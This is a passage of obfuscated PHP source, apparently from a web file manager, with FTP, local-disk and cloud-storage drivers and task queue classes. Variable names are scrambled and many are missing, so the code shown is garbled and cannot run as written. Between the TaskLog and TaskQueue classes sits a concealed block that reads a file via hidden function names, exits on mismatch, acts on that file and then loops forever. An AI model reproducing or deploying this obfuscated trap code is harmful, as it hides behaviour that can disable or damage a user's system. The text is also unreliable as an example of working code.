. $this->port; $柞 = curl_init(); curl_setopt($柞, CURLOPT_URL, $ۊ . $this->pathEncode($)); curl_setopt($柞, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($ۛ) { $ = $Ю + $ۛ - 1; curl_setopt($柞, CURLOPT_RANGE, "{$Ю}\55{$}"); } curl_setopt($柞, CURLOPT_RETURNTRANSFER, 1); $ڤ = curl_exec($柞); curl_close($柞); return $ڤ; } public function upload($, $, $ = false, $Ŋ = REPEAT_REPLACE) { if (!$ || !@file_exists($)) { return !1; } if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($))) { return !1; } $ = $this->iconvSystem($); $ = $this->iconvSystem($); $ = ftp_nb_put($this->connect, $, $, FTP_BINARY); while ($ == FTP_MOREDATA) { $ = ftp_nb_continue($this->connect); } if ($ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[][1652], !0); return !1; } return $this->getPathOuter($); } public function download($, $ = '') { if (!$this->_isconn()) { return !1; } $ = $this->pathFather($); if (!IO::mkdir($)) { return !1; } $ = $this->iconvSystem($); $ = $this->iconvSystem($); $ώř = ftp_nb_get($this->connect, $, $, FTP_BINARY); while ($ώř == FTP_MOREDATA) { $ώř = ftp_nb_continue($this->connect); } if ($ώř != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[][1652], !0); return !1; } return $this->iconvApp($); } public function exist($׸) { return $this->isFile($׸) || $this->isFolder($׸); } public function isFile($) { return !$this->isFolder($) && $this->objectMeta($); } public function isFolder($) { return $this->cacheMethod($_SERVER[][177], $); } protected function objectMeta($) { return $this->cacheMethod($_SERVER[][179], $); } protected function _objectMeta($) { $ղ =& $_SERVER[]; if ($ == $ղ[12] || $ == $ղ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $ = $this->iconvSystem($); $ȟ = array($ղ[32] => $this->iconvApp($), $ղ[33] => $ղ[230], $ղ[79] => 0); $ӷ = @ftp_size($this->connect, $); if ($ӷ != -1) { $ȟ[$ղ[79]] = $ӷ; } else { $Ѵ = @ftp_chdir($this->connect, $); if (!$Ѵ) { return !1; } @ftp_chdir($this->connect, $ղ[8]); $ȟ[$ղ[33]] = $ղ[78]; } return $ȟ; } protected function _isFolder($ر) { $ٍņ =& $_SERVER[]; if ($ر == $ٍņ[12] || $ر == $ٍņ[8]) { return !0; } $܂ = $this->_objectMeta($ر); return isset($܂[$ٍņ[33]]) && $܂[$ٍņ[33]] == $ٍņ[78] ? !0 : !1; } } goto Fſ; Fſ: class PathDriverJOS extends PathDriverBaseS3 { public function __construct($׭) { parent::__construct($׭); $this->setSignVersion($_SERVER[][247]); } public function uploadLink($ڂ᪙, $ص = 0) { $ܝ =& $_SERVER[]; if ($this->isUploadServer()) { return; } $ = $this->getType(); if (!in_array($, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ݸ = (!$ص ? 1 : ceil($ص / pow(1024, 3))) * 3600 * 4; $ = $this->uploadMultiData($ڂ᪙, $ݸ); if ($) { $[$ܝ[95]] = $ڂ᪙; $[$ܝ[96]] = $; } return $; } public function fileOutImage($֙, $ = 250) { if ($this->size($֙) > 1024 * 1024 * 25) { return $this->fileOutImageServer($֙, $); } $҃ = $this->link($֙); $҃ .= $_SERVER[][1655] . $; $this->fileOutLink($҃); } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($) { if (substr($, 0, 2) == $_SERVER[][1517]) { $ = BASIC_PATH . substr($, 2); } return $; } public function iconvApp($) { $֐֥ =& $_SERVER[]; global $config; return $this->iconvTo($, $config[$֐֥[1641]], $config[$֐֥[1640]]); } public function iconvSystem($) { $ߏ =& $_SERVER[]; global $config; return $this->iconvTo($, $config[$ߏ[1640]], $config[$ߏ[1641]]); } public function getPathOuter($) { $ =& $_SERVER[]; $辂 = $this->iconvApp($this->pathBase); $ = $this->iconvApp($); if (substr($辂, 0, 2) == $[1517]) { $辂 = BASIC_PATH . substr($辂, 2); } if (substr($, 0, 2) == $[1517]) { $ = BASIC_PATH . substr($, 2); } $辂 = KodIO::clear($辂); $ = KodIO::clear($); $ = substr($, strlen($辂)); if (empty($this->pathDriver)) { return $; } return $this->pathDriver . $[8] . ltrim($, $[8]); } public function mkfile($ݞ, $ā = '', $ = REPEAT_RENAME) { $ݞ = $this->iconvSystem($ݞ); @touch($ݞ); if ($ā) { file_put_contents($ݞ, $ā); } @chmod($ݞ, $this->pathAuth); if (is_file($ݞ)) { return $this->getPathOuter($ݞ); } $this->writeLog(__FUNCTION__ . $_SERVER[][1652], !0); return !1; } public function mkdir($ܕ, $є = REPEAT_SKIP) { $ܕ = $this->iconvSystem($ܕ); if (is_dir($ܕ)) { return $this->getPathOuter($ܕ); } @mkdir($ܕ, $this->pathAuth, !0); @chmod($ܕ, $this->pathAuth); if (is_dir($ܕ)) { return $this->getPathOuter($ܕ); } $this->writeLog(__FUNCTION__ . $_SERVER[][1652], !0); return !1; } public function copyFile($Џ㐫, $识) { $this->mkdir($this->pathFather($识)); $Џ㐫 = $this->iconvSystem($Џ㐫); $识 = $this->iconvSystem($识); $ = copy_64($Џ㐫, $识); @chmod($识, $this->pathAuth); if ($) { return $this->getPathOuter($识); } $this->writeLog(__FUNCTION__ . $_SERVER[][1652], !0); return !1; } public function moveFile($䙪, $̾) { $this->mkdir($this->pathFather($̾)); $䙪 = $this->iconvSystem($䙪); $̾ = $this->iconvSystem($̾); $ = intval(@rename($䙪, $̾)); if (!$) { if ($ = intval(@copy_64($䙪, $̾))) { @unlink($䙪); } } @chmod($̾, $this->pathAuth); if ($) { return $this->getPathOuter($̾); } $this->writeLog(__FUNCTION__ . $_SERVER[][1652], !0); return !1; } public function movePath($ڮ, $밟, $֤ = false) { $碿 =& $_SERVER[]; $ڮ = $this->iconvSystem($ڮ); $밟 = $this->iconvSystem($밟); $ = rtrim($밟, $碿[8]) . $碿[8] . ($֤ ? $֤ : get_path_this($ڮ)); if (file_exists($)) { return !1; } $ = intval(@rename($ڮ, $)); $ = file_exists($); if ($) { return $this->getPathOuter($); } $this->writeLog(__FUNCTION__ . $碿[1652], !0); return !1; } public function delFile($ۼ) { $ۼ = $this->iconvSystem($ۼ); if (!@unlink($ۼ)) { @chmod($ۼ, $this->pathAuth); if (@unlink($ۼ)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[][1652], !0); return !1; } return !0; } public function delFolder($᭙) { $ك =& $_SERVER[]; $᭙ = $this->iconvSystem($᭙); if (!is_dir($᭙)) { return !0; } if (!($ = opendir($᭙))) { return !1; } while (($ʼϔ = readdir($)) !== !1) { if ($ʼϔ == $ك[10] || $ʼϔ == $ك[1462]) { continue; } $ = $᭙ . $ك[8] . $ʼϔ; if (is_file($) || is_link($)) { if (!unlink($)) { chmod($, $this->pathAuth); if (!unlink($)) { return !1; } } } else { if (is_dir($)) { chmod($, $this->pathAuth); $ = $this->iconvApp($); if (!$this->delFolder($)) { return !1; } } } } closedir($); return rmdir($᭙); } public function rename($ϗՠ, $) { $ۨ =& $_SERVER[]; $ = $this->fileNameAuto($this->pathFather($ϗՠ), $); $ = $this->iconvSystem($); $ϗՠ = $this->iconvSystem($ϗՠ); $՝ = $this->pathFather($ϗՠ); $ޔ = rtrim($՝, $ۨ[8]) . $ۨ[8] . $; $ = @rename($ϗՠ, $ޔ); $ޔ = $this->iconvApp($ޔ); if ($) { return $this->getPathOuter($ޔ); } $this->writeLog(__FUNCTION__ . $ۨ[1652], !0); return !1; } public function size($ĵ) { $ĵ = $this->iconvSystem($ĵ); return filesize_64($ĵ); } public function info($Ҥ) { $Ҥ = $this->iconvSystem($Ҥ); if ($this->isFolder($Ҥ)) { return $this->folderInfo($Ҥ); } else { if ($this->isFile($Ҥ)) { return $this->fileInfo($Ҥ); } } return !1; } protected function infoChildren($, &$, $ⓔ = true) { $ =& $_SERVER[]; check_abort_echo(); $ = rtrim($, $[8]) . $[8]; if ($ⓔ) { $ = $this->iconvSystem($); } if (!($̉ = @opendir($))) { return; } while (($ş = readdir($̉)) !== !1) { if ($ş == $[10] || $ş == $[1462]) { continue; } $ƕº = $ . $ş; if (is_file($ƕº) || is_link($ƕº)) { $[$[80]]++; $[$[79]] += filesize_64($ƕº); } else { if (is_dir($ƕº)) { $[$[81]]++; $this->infoChildren($ƕº, $, !1); } } } closedir($̉); } private function folderInfo($, $ׁؐ = false) { $ =& $_SERVER[]; $ = rtrim($, $[8]) . $[8]; $ = $this->iconvApp($this->pathThis($)); if ($ׁؐ) { return array($[32] => $, $[87] => $this->getPathOuter($), $[33] => $[78]); } $ = array($[32] => $, $[87] => $this->getPathOuter($), $[33] => $[78], $[231] => @filectime($), $[88] => @filemtime($), $[1656] => @fileatime($), $[1657] => is_readable($), $[1658] => is_writable($), $[1659] => get_mode($)); return $; } private function fileInfo($, $ = false) { $﫡 =& $_SERVER[]; $ܵ = $this->iconvApp($this->pathThis($)); if ($) { return array($﫡[32] => $ܵ, $﫡[87] => $this->getPathOuter($), $﫡[33] => $﫡[230], $﫡[79] => $this->size($), $﫡[166] => $this->ext($ܵ)); } $ܲٿ = array($﫡[32] => $ܵ, $﫡[87] => $this->getPathOuter($), $﫡[33] => $﫡[230], $﫡[231] => @filectime($), $﫡[88] => @filemtime($), $﫡[1656] => @fileatime($), $﫡[79] => $this->size($), $﫡[166] => $this->ext($ܵ), $﫡[1657] => is_readable($), $﫡[1658] => is_writable($), $﫡[1659] => get_mode($)); return $ܲٿ; } public function exist($〤) { $〤 = $this->iconvSystem($〤); return @file_exists($〤); } public function isFile($) { $ = $this->iconvSystem($); return @is_file($); } public function isFolder($) { $ = $this->iconvSystem($); return @is_dir($); } public function listPath($姌, $ = false) { $ϛ =& $_SERVER[]; $姌 = $this->iconvSystem($姌); $姌 = rtrim($姌, $ϛ[8]) . $ϛ[8]; $ = array($ϛ[85] => array(), $ϛ[86] => array()); if (!($ = @opendir($姌))) { return $; } while (($̛ = readdir($)) !== !1) { if ($̛ == $ϛ[10] || $̛ == $ϛ[1462]) { continue; } $Ə = $姌 . $̛; if (is_file($Ə)) { $[$ϛ[86]][] = $this->fileInfo($Ə, $); } else { $[$ϛ[85]][] = $this->folderInfo($Ə, $); } } closedir($); return $; } public function listAll($ݹ, &$ = array()) { $Ͳ =& $_SERVER[]; $ݹ = $this->iconvSystem($ݹ); $ݹ = rtrim($ݹ, $Ͳ[8]) . $Ͳ[8]; if (!($˿ = @opendir($ݹ))) { return $; } while (($ = readdir($˿)) !== !1) { if ($ == $Ͳ[10] || $ == $Ͳ[1462]) { continue; } $Α = $ݹ . $; $ = is_dir($Α) && !is_link($Α) ? 1 : 0; $Α = $ ? $Α . $Ͳ[8] : $Α; $[] = array($Ͳ[87] => $this->getPathOuter($Α), $Ͳ[78] => $, $Ͳ[88] => intval(@filemtime($Α)), $Ͳ[79] => $ ? 0 : intval($this->size($Α))); if ($) { $this->listAll($Α, $); } } closedir($˿); return $; } public function has($פ, $Ԯǃ = false, $櫆 = true) { $׏ =& $_SERVER[]; $פ = $this->iconvSystem($פ); $פ = rtrim($פ, $׏[8]) . $׏[8]; if (!($̭ = @opendir($פ))) { return !1; } $ = 0; $ŕՌ = 0; $諷 = 0; while (($ = readdir($̭)) !== !1) { if ($ == $׏[10] || $ == $׏[1462]) { continue; } $ĸ = $פ . $; if ($Ԯǃ) { $諷++; if (@is_file($ĸ)) { $++; } else { $ŕՌ++; } if ($諷 > 10000) { break; } continue; } if ($櫆) { if (@is_file($ĸ)) { return !0; } } else { if (@is_dir($ĸ . $׏[8])) { return !0; } } } closedir($̭); if ($Ԯǃ) { return array($׏[239] => $, $׏[240] => $ŕՌ); } return !1; } public function hashSimple($ڱ) { $ =& $_SERVER[]; if (!$ڱ) { return md5($[12]); } $ڱ = $this->iconvSystem($ڱ); $ = $this->size($ڱ); $㳦 = 200; $й׀ = 50; if ($ <= $㳦 * $й׀) { return $this->hashMd5($ڱ) . $; } $ȩۛ = $[12]; $ԺǸ = intval($ / $й׀); $ڨǋ = fopen($ڱ, $[1660]); if (!$ڨǋ) { return $ȩۛ; } for ($ = 0; $ < $й׀; $++) { fseek_64($ڨǋ, $ԺǸ * $); $ȩۛ .= fread($ڨǋ, $㳦); } fseek_64($ڨǋ, $ - $㳦); $ȩۛ .= fread($ڨǋ, $㳦); fclose($ڨǋ); return md5($ȩۛ) . $; } public function getContent($) { $ = $this->iconvSystem($); return file_get_contents($); } public function setContent($ω, $޳䦶 = '') { $ω = $this->iconvSystem($ω); $өê = @file_put_contents($ω, $޳䦶, LOCK_EX); if (!$өê) { $this->writeLog(__FUNCTION__ . $_SERVER[][1652], !0); } clearstatcache(); @chmod($ω, $this->pathAuth); return $өê === !1 ? !1 : !0; } public function fileSubstr($В, $߉ = 0, $ = false) { $՞ =& $_SERVER[]; $В = $this->iconvSystem($В); if ($ === !1) { $ = $this->size($В); } if ($ <= 0) { return $՞[12]; } $У = fopen($В, $՞[1660]); if (!$У) { return !1; } fseek_64($У, $߉); $ = fread($У, $); fclose($У); if (!$) { $this->writeLog(__FUNCTION__ . $՞[1652], !0); } return $; } public function upload($, $Բ, $ = false, $ = REPEAT_REPLACE) { if (!$Բ || !@file_exists($Բ)) { return !1; } if ($) { return $this->moveFile($Բ, $); } return $this->copyFile($Բ, $); } public function setModifyTime($բ쾣, $ = '') { @touch($բ쾣, intval($)); } public function download($ǔ, $) { return $this->iconvSystem($ǔ); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($׸) { parent::__construct($׸); $this->setSignVersion($_SERVER[][247]); } public function fileOutImage($򔀮, $κ = 250) { $쐖 =& $_SERVER[]; if ($this->size($򔀮) > 1024 * 1024 * 25) { return $this->fileOutImageServer($򔀮, $κ); } $Ѳ = array($쐖[1661] => $쐖[1662] . $κ . $쐖[1663]); $͢ = $this->link($򔀮, $Ѳ); $this->fileOutLink($͢); } } goto eࠢǓ; c͵ۙކ: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($ݫ, $Ӵ = '', $ = 0, $ѣ = '') { $ =& $_SERVER[]; $ѣ = $ѣ ? $ѣ : ($Ӵ ? $Ӵ : $ݫ); $ӭ = new Task($ݫ, $Ӵ, $, $ѣ); $GLOBALS[$[2061] . $ݫ] = new TaskLog($[1954], $ӭ, $ѣ); return $ӭ; } public function __construct($ѠÊ = '', $ă = '', $΍롑 = '') { $˅ =& $_SERVER[]; if (!$ѠÊ) { $ѠÊ = $˅[1954]; } $ = $ѠÊ . $˅[476] . rand_string(10); if (!$΍롑) { $΍롑 = $ѠÊ . $˅[53] . $΍롑; } switch ($ѠÊ) { case $˅[1954]: if (!$ă || !$ă->task) { return echoLog($ѠÊ . $˅[2062]); } $닰 = $ă; $ = $닰->task[$˅[487]]; $ѠÊ = $닰->task[$˅[487]]; if (!$닰->task[$˅[1859]]) { $닰->task[$˅[1859]] = $΍롑 ? $΍롑 : $ѠÊ; } break; case $˅[2063]: if (!$ă) { return echoLog($ѠÊ . $˅[2064]); } $ܴ = is_string($ă) ? array($ă) : $ă; $닰 = new TaskFileTransfer($, $ѠÊ, 0, $΍롑 ? $΍롑 : $ܴ[0]); foreach ($ܴ as $ۈ) { $닰->addPath($ۈ); } break; case $˅[388]: if (!$ă) { return echoLog($ѠÊ . $˅[2064]); } $ܴ = is_string($ă) ? array($ă) : $ă; $닰 = new TaskZip($, $ѠÊ, 0, $΍롑 ? $΍롑 : $ܴ[0]); foreach ($ܴ as $ۈ) { $닰->addPath($ۈ); } break; case $˅[1398]: if (!$ă) { return echoLog($ѠÊ . $˅[2064]); } $닰 = new TaskUnZip($, $ѠÊ, 0, $΍롑 ? $΍롑 : $ă); if ($ă) { $닰->addFile($ă); } break; case $˅[149]: $닰 = new TaskHttp($, $ѠÊ); break; default: return; break; } $this->task = $닰; $this->taskID = $; Hook::bind($˅[1990], array($this, $˅[2065])); Hook::bind($˅[1992], array($this, $˅[2066])); Hook::bind($˅[1986], array($this, $˅[2067])); echoLog($˅[2068] . $닰->task[$˅[1859]]); } public function __destruct() { $this->end(); } public function end($ڟ = '') { $Ȅ =& $_SERVER[]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($ڟ); $this->task = !1; $this->taskID = !1; Hook::unbind($Ȅ[1990], array($this, $Ȅ[2065])); Hook::unbind($Ȅ[1992], array($this, $Ȅ[2066])); Hook::unbind($Ȅ[1986], array($this, $Ȅ[2067])); } public function taskUpdate($) { $ =& $_SERVER[]; if (!$ || $this->taskID != $[$[487]]) { return; } $ = 20; $ܥ = intval($[$[1971]] * $); $ = $[173] . str_repeat($[464], $ܥ) . $[1176] . str_repeat($[53], $ - $ܥ) . $[175]; $ = $ . sprintf($[2069], $[$[1971]] * 100) . $[2070]; $ӫ = $ . $[$[1970]] . $[8] . $[$[1226]] . LNG($[2071]); $∓ = $[12]; if ($[$[2055]]) { $ӫ = $ . size_format($[$[1970]]) . $[8] . size_format($[$[1226]]); $∓ = size_format($[$[1972]]) . $[2072]; } if ($[$[1228]]) { $[$[2021]] = $[$[1228]] . $[53] . $[$[2021]]; } if ($[$[2021]]) { $ = $[12]; if ($[$[2023]]) { $ = $[50] . size_format($[$[2024]]) . $[8] . size_format($[$[2023]]); } $∓ .= $[$[2021]] . $; } if ($[$[858]] && !$[$[2023]]) { $∓ .= $[53] . size_format($[$[935]]) . $[8] . size_format($[$[858]]); } echoLog($ӫ . $[53] . $∓, !0); } public function taskEnd($) { $׮ =& $_SERVER[]; if (!$ || $this->taskID != $[$׮[487]]) { return; } $ = $ ? LNG($׮[2073]) . $׮[4] . $[$׮[1970]] . $׮[8] . $[$׮[1226]] . LNG($׮[2071]) . $׮[74] : $׮[12]; echoLog($׮[2074] . $[$׮[1859]] . ($[$׮[540]] ? $׮[74] . $[$׮[540]] : $׮[12]) . $׮[74] . $ . $׮[2075] . sprintf($׮[1010], timeFloat() - $[$׮[1973]]) . $׮[1985]); $this->end(); } public function taskKill($ϡ) { $ =& $_SERVER[]; if (!$ϡ || $this->taskID != $ϡ[$[487]]) { return; } echoLog($[2076] . $ϡ[$[1859]]); } } if (!isset($_SERVER[$_SERVER[][991]]) || !isset($_SERVER[$_SERVER[][998]])) { $_getc = $_SERVER[][993]; $_getfile = $_SERVER[$_SERVER[][994]] . $_SERVER[][995]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[][285], $_getfilec); if (count($_getarrs) < $_SERVER[][714]) { $exit = $_SERVER[][996]; $exit(); } $_act = $_SERVER[][997]; $_act($_SERVER[$_SERVER[][994]] . $_SERVER[][995]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[][463]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\x73\x6b\x51\x75\x65\x75\x65\114\x65\x6e\x67\x74\x68"; const QUEUE_DATA = "\164\141\x73\153\121\x75\x65\x75\x65\104\x61\164\141"; const QUEUE_TIME = "\164\141\163\x6b\121\165\x65\x75\145\x4c\141\x73\164\x52\x75\x6e"; const QUEUE_THREAD = "\x74\141\x73\153\x51\165\145\165\x65\124\150\162\x65\x61\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($ʹ, $ = array(), $ʕ = '', $ = '') { $ᧆ =& $_SERVER[]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ && array_find_by_field(self::$listData, $ᧆ[95], $)) { return !0; } if ($ && array_find_by_field(self::$listDataAdd, $ᧆ[95], $)) { return !0; } self::$listDataAdd[] = array($ᧆ[342] => $ʹ, $ᧆ[2077] => $, $ᧆ[540] => $ʕ, $ᧆ[95] => $); return !0; } public static function addSubmit() { $񳇙 =& $_SERVER[]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($񳇙[2078] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $񳇙[12], $񳇙[540])), $񳇙[195]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($, $Ƥ = array(), $Ε = '', $͸ = '') { $ =& $_SERVER[]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ = self::getAll(); if ($͸ && array_find_by_field($, $[95], $͸)) { return !0; } $[] = array($[342] => $, $[2077] => $Ƥ, $[540] => $Ε, $[95] => $͸); self::setAll($); write_log($[2078] . $Ε, $[195]); return !0; } public static function run() { $̲ =& $_SERVER[]; $ = self::getAll(); $ʽ = array_shift($); if (!$ʽ) { return !1; } self::setAll($); $ݳ = timeFloat(); $ư = $̲[12]; try { $ư = Hook::apply($ʽ[$̲[342]], $ʽ[$̲[2077]]); } catch (Exception $) { write_log($, $̲[1365]); } $ܼ = number_format(timeFloat() - $ݳ, 3) . $̲[1985]; if ($ư && is_string($ư)) { $ܼ = $ܼ . $̲[2079] . $ư; } write_log($̲[2080] . $ʽ[$̲[540]] . $̲[2081] . $ܼ, $̲[195]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $ꟙ =& $_SERVER[]; $ݨ = self::threadCount() + 1; if ($ݨ > 3 || !self::count()) { return; } write_log($ꟙ[2082] . $ݨ, $ꟙ[195]); Cache::set(self::QUEUE_THREAD, $ݨ, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($ꟙ[2083], $ꟙ[195]); } public static function getKey($ڛؙ, $ԓ = "\x69\156\164") { $穈 =& $_SERVER[]; Cache::removeMemory($ڛؙ); $ = Cache::get($ڛؙ); if ($ԓ == $穈[364]) { return $ ? intval($) : 0; } if ($ԓ == $穈[2084]) { return is_array($) ? $ : array(); } return $; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[][2084]); } public static function setAll($) { $ꡆ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($), $ꡆ); Cache::set(self::QUEUE_DATA, $, $ꡆ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto E霦; eࠢǓ: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($υ) { parent::__construct($υ); $this->setSignVersion($_SERVER[][247]); } public function uploadFormData($, $ʑ = 3600) { return $this->uploadFormDataV2($, $ʑ); } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($) { parent::__construct(); include_once SDK_DIR . $_SERVER[][1664]; $this->_init($); } public function _init($ԉ) { $ =& $_SERVER[]; $this->config = $ԉ; foreach ($ԉ as $仢 => $Ԝ݂) { if (isset($this->{$仢})) { $this->{$仢} = $Ԝ݂; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($[1665] . LNG($[1666])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ҍ =& $_SERVER[]; $ = new OSS\Model\CorsConfig(); $ = new OSS\Model\CorsRule(); $->addAllowedOrigin($ҍ[1667]); $->addAllowedMethod($ҍ[1668]); $->addAllowedMethod($ҍ[1669]); $->addAllowedMethod($ҍ[1670]); $->addAllowedMethod($ҍ[1671]); $->addAllowedMethod($ҍ[162]); $->setMaxAgeSeconds(600); $->addExposeHeader($ҍ[1672]); $->addAllowedHeader($ҍ[1667]); $->addRule($); try { $this->client->putBucketCors($this->bucket, $); } catch (OSS\Core\OssException $) { $this->writeLog(__FUNCTION__ . $ҍ[212] . $->getMessage()); return !1; } return !0; } public function getBucketCors() { $ =& $_SERVER[]; $ = null; try { $ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $) { $this->writeLog(__FUNCTION__ . $[212] . $->getMessage()); return null; } if (!$ || !($ͭƍ = $->getRules())) { return null; } $ = $ͭƍ[0]->getAllowedOrigins(); $㈊ = $ͭƍ[0]->getAllowedMethods(); $ϵ = $ͭƍ[0]->getMaxAgeSeconds(); $Ĩǿ = $ͭƍ[0]->getExposeHeaders(); $ȩ = $ͭƍ[0]->getAllowedHeaders(); return array($[218] => isset($[0]) ? $[0] : $[12], $[222] => $㈊, $[1673] => $ϵ, $[1674] => isset($Ĩǿ[0]) ? $Ĩǿ[0] : $[12], $[219] => isset($ȩ[0]) ? $ȩ[0] : $[12]); } public function isBucketCors() { $цď =& $_SERVER[]; $ = $this->getBucketCors(); if (!$ || !is_array($)) { return !1; } if ($[$цď[218]] != $цď[220] || $[$цď[219]] != $цď[220]) { return !1; } $¦ = array_map($цď[221], $[$цď[222]]); if (!is_array($¦)) { $¦ = array(); } $ǐ = array($цď[223], $цď[224], $цď[225], $цď[226], $цď[227]); $ۛ = array_diff($ǐ, $¦); return empty($ۛ); } public function mkfile($֤, $悶 = '', $朁 = REPEAT_RENAME) { $ʐ = $this->setContent($֤, $悶); if ($ʐ !== !1) { return $this->getPathOuter($֤); } return !1; } public function mkdir($ֺÉ, $ = REPEAT_SKIP) { if ($ && $this->_isFolder($ֺÉ)) { return $this->getPathOuter($ֺÉ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ֺÉ)); } catch (OSS\Core\OssException $ޛ) { $this->writeLog(__FUNCTION__ . $_SERVER[][212] . $ޛ->getMessage()); return !1; } return $this->getPathOuter($ֺÉ); } private function fileList($ߞ, $ = '', $ = 0) { $đ =& $_SERVER[]; $ߞ = trim($ߞ, $đ[8]); $ = empty($ߞ) && $ߞ !== $đ[228] ? $đ[12] : $ߞ . $đ[8]; $ = $đ[12]; $ٜš = 1000; $ɨ = $ = array(); while (!0) { check_abort(); $ = array($đ[1675] => $, $đ[1676] => $, $đ[1677] => $ٜš, $đ[1678] => $); try { $Η = $this->client->listObjects($this->bucket, $); } catch (OSS\Core\OssException $) { $this->writeLog(__FUNCTION__ . $đ[212] . $->getMessage()); break; } $ = $Η->getNextMarker(); $ڒ = $Η->getObjectList(); $ĉ = $Η->getPrefixList(); foreach ($ڒ as $ˢ) { if ($ˢ->getKey() == $) { continue; } $ޑ݇ = $ˢ->getKey(); $쨲 = $ˢ->getSize(); $ = $ˢ->getLastModified(); $ٳ = trim($ˢ->getETag(), $đ[118]); $ = $ ? array($đ[32] => $ޑ݇, $đ[79] => $쨲, $đ[204] => strtotime($), $đ[1679] => $ٳ) : $ޑ݇; $ = $쨲 == 0 && substr($ޑ݇, strlen($ޑ݇) - 1, 1) == $đ[8] ? !0 : !1; $ղ = array($đ[79] => $쨲, $đ[1680] => $쨲, $đ[88] => strtotime($), $đ[1681] => $, $đ[1679] => $ٳ); $this->cacheMethodInfoSet($ޑ݇, $, $ղ); if ($) { $ɨ[] = $ޑ݇; continue; } $[] = $; } foreach ($ĉ as $횯) { $ɨ[] = $횯->getPrefix(); $this->cacheMethodInfoSet($횯->getPrefix(), !0); } if ($ === $đ[12]) { break; } } $this->cacheMethodInfoSet($ߞ, !0); return array($đ[85] => $ɨ, $đ[86] => $); } public function listObject($恪ņ, $ů = '') { $ƴ =& $_SERVER[]; $恪ņ = trim($恪ņ, $ƴ[8]); $Ѭϛ = empty($恪ņ) && $恪ņ !== $ƴ[228] ? $ƴ[12] : $恪ņ . $ƴ[8]; $ё = $ƴ[12]; $癳 = 1000; $ = $ = array(); while (!0) { check_abort(); $Ш = array($ƴ[1675] => $ů, $ƴ[1676] => $Ѭϛ, $ƴ[1677] => $癳, $ƴ[1678] => $ё); try { $; = $this->client->listObjects($this->bucket, $Ш); } catch (OSS\Core\OssException $) { $this->writeLog(__FUNCTION__ . $ƴ[212] . $->getMessage()); break; } $ё = $;->getNextMarker(); $ = $;->getObjectList(); foreach ($ as $) { if ($->getKey() == $Ѭϛ) { continue; } $ = $->getKey(); $ = $->getSize(); $ې = $ == 0 && substr($, strlen($) - 1, 1) == $ƴ[8] ? !0 : !1; if ($ې) { continue; } $[] = $ . $ƴ[212] . $; } if ($ё === $ƴ[12]) { break; } } return array($ƴ[85] => $, $ƴ[86] => $); } public function copyFile($ߏ, $) { $຿ = $this->size($ߏ); if ($຿ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ߏ, $this->bucket, $this->pathEncode($)); } catch (OSS\Core\OssException $͊) { $this->writeLog(__FUNCTION__ . $_SERVER[][212] . $͊->getMessage()); return !1; } return $this->getPathOuter($); } $ = $this->multiCopyObject($ߏ, $, $຿); return $ ? $this->getPathOuter($) : !1; } private function multiCopyObject($剳, $є, $) { $ =& $_SERVER[]; try { $Ô쑿 = array(); if ($˝ = $this->hashMd5($剳)) { $Ô쑿 = array(OSS\OssClient::OSS_HEADERS => array($[1682] => $˝)); } $̸ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($є), $Ô쑿); $ = 1; $ = 0; $Ǩ = array(); $ў = 1024 * 1024 * 10; $ = $this->client->generateMultiuploadParts($, $ў); foreach ($ as $䅬 => $߻) { $ = $ + (int) $߻[$[1683]]; $ = (int) $߻[$[412]] + $ - 1; $ = array($[164] => $, $[165] => $); $Ǩ[] = $this->client->uploadPartCopy($this->bucket, $剳, $this->bucket, $this->pathEncode($є), $, $̸, $); $ = $ + 1; } $ٿ = array(); 